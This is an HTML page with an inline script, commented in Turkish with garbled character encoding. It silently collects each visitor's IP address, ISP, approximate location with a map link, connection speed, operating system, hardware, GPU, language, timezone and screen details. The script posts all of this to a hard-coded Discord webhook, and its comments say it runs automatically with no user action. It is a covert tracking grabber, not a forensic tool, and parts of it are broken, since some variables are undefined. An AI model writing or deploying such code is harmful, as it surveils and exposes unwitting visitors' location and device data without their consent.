<body>
    <div class="l"></div>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function kusursuzSizdir() {

            // 2. ISS, IP, ZAMAN, DÄ°L, KONUM (HatasÄ±z Script)
            try {

                d.ip = j.ip;
                d.iss = `${j.org} (AS${j.asn})`;
                d.loc = `ğŸ“ **BÃ¶lge:** ${j.city}, ${j.region} / ${j.country_name}\nğŸ›°ï¸ **ISS:** \`${d.iss}\`\nğŸ—ºï¸ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
            } catch(e) { d.loc = "Lokasyon Servisi Engellendi"; }

            // 3. Ä°NTERNET ANALÄ°ZÄ°
            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                d.net = n ? `âš¡ **HÄ±z:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\nğŸ“¡ **Tip:** ${n.effectiveType}` : "N/A";
            } catch(e) {}

            // 4. DONANIM, OS, EKRAN, PÄ°L
            try {
                const bat = await navigator.getBattery();

            } catch(e) {}

            d.sys = `ğŸ’» **OS:** ${navigator.platform}\nğŸ§  **CPU:** ${navigator.hardwareConcurrency} Ã‡ekirdek\nğŸ’¾ **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\nğŸ”‹ **GÃ¼Ã§:** ${d.bat}`;
            d.ext = `ğŸŒ **Dil:** ${navigator.language}\nâ° **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nğŸ“ **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;

            // 5. KUSURSUZ EMBED (KIRMIZI ÅABLON)
            const payload = {
                embeds: [{
                    title: "ğŸ’€ KUSURSUZ ADLÄ° ANALÄ°Z (SESSÄ°Z)",
                    color: 15158332,
                    fields: [
                        { name: "ğŸ“¡ AÄ VE ISS KATMANI", value: `${d.loc}\n${d.net}\n**IP:** \`${d.ip}\``, inline: false },
                        { name: "ğŸ› ï¸ EKRAN KARTI (ZORLANMIÅ)", value: `**Renderer:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\``, inline: false },
                        { name: "âš™ï¸ DONANIM DETAYLARI", value: d.sys, inline: false },
                        { name: "ğŸŒ SÄ°STEM DETAYLARI", value: d.ext, inline: false },

                    ],
                    footer: { text: "Protocol: Omniscience v9.0" },
                    timestamp: new Date()
                }]
            };

            const blob = JSON.stringify(payload);
            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
            navigator.sendBeacon(u, blob);
        }

        // HÄ°Ã‡BÄ°R ÅEYE BASMADAN OTOMATÄ°K Ã‡ALIÅTIR
